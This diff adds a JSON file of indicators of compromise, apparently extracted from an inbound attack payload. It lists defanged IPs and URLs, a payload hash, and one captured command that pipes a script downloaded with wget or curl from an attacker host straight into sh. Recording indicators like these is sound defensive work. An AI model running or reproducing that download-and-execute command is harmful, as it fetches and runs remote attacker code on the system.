@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.164.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "217.60.195.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217.60.195.XXX/sh"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217.60.195.XXX/sh)"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "9bc51b5fdc44bc34c36f7483d59006b11ddd2e5db6395e15e2b81dcfe57b77da"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre"
+  },
+  {
+    "asn": "Oracle Corporation",
+    "country": "United States",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "165.1.78.XXX"
+  }
+]
